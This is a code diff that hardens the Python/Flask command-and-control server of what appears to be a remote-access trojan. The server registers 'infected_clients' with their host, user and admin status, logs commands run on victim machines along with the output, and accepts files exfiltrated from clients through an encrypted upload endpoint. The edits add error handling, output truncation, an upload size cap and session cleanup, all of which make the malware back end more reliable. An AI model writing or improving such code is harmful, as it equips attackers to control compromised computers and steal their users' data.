@@ -76,38 +76,44 @@ def init_db():
 def db_save_client(info):
     """Save or update client registration in SQLite"""
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("""
-            INSERT INTO clients (client_id, host, ip, pid, os, user, admin, first_seen, last_seen, status)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'ALIVE')
-            ON CONFLICT(client_id) DO UPDATE SET
-                pid=excluded.pid,
-                last_seen=excluded.last_seen,
-                status='ALIVE'
-        """, (
-            info['client_id'],
-            info.get('host', 'unknown'),
-            info.get('ip', 'unknown'),
-            info.get('pid', 0),
-            info.get('os', 'Unknown'),
-            info.get('user', 'unknown'),
-            1 if info.get('admin') else 0,
-            now,
-            now
-        ))
-        conn.commit()
+    try:
+        with sqlite3.connect(DB_FILE) as conn:
+            cursor = conn.cursor()
+            cursor.execute("""
+                INSERT INTO clients (client_id, host, ip, pid, os, user, admin, first_seen, last_seen, status)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'ALIVE')
+                ON CONFLICT(client_id) DO UPDATE SET
+                    pid=excluded.pid,
+                    last_seen=excluded.last_seen,
+                    status='ALIVE'
+            """, (
+                info['client_id'],
+                info.get('host', 'unknown'),
+                info.get('ip', 'unknown'),
+                info.get('pid', 0),
+                info.get('os', 'Unknown'),
+                info.get('user', 'unknown'),
+                1 if info.get('admin') else 0,
+                now,
+                now
+            ))
+            conn.commit()
+    except Exception as e:
+        print(f"[!] DB save_client failed: {e}")
 
 def db_log_command(client_id, command, output):
     """Log executed command output into SQLite"""
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("""
-            INSERT INTO command_logs (client_id, command, output, timestamp)
-            VALUES (?, ?, ?, ?)
-        """, (client_id, command, output, now))
-        conn.commit()
+    try:
+        with sqlite3.connect(DB_FILE) as conn:
+            cursor = conn.cursor()
+            cursor.execute("""
+                INSERT INTO command_logs (client_id, command, output, timestamp)
+                VALUES (?, ?, ?, ?)
+            """, (client_id, command, output[:10000], now))
+            conn.commit()
+    except Exception as e:
+        print(f"[!] DB log_command failed: {e}")
 
 init_db()
 
@@ -360,7 +366,14 @@ def upload_file():
     cid_from_param = request.args.get("id")
     data = decrypt_payload(client_id=cid_from_param)
     filename = data.get("name", "unknown")
-    file_data = base64.b64decode(data.get("file", ""))
+    file_b64 = data.get("file", "")
+    if len(file_b64) > 150 * 1024 * 1024:  # ~112MB decoded (base64 is ~1.33x)
+        print(f"[!] Rejected oversized upload from {data.get('client_id', '?')}: {len(file_b64)} chars")
+        return "File too large", 413
+    try:
+        file_data = base64.b64decode(file_b64)
+    except Exception:
+        return "Invalid file data", 400
     client_id = data.get("client_id", request.remote_addr)
     timestamp = datetime.now().strftime("%H:%M:%S")
 
@@ -595,6 +608,8 @@ def cleanup_dead_clients():
             del infected_clients[cid]
             if cid in pending_commands:
                 del pending_commands[cid]
+            with session_lock:
+                client_sessions.pop(cid, None)
         # Reset target if it was pointing to a dead client
         if target_client in dead:
             target_client = None
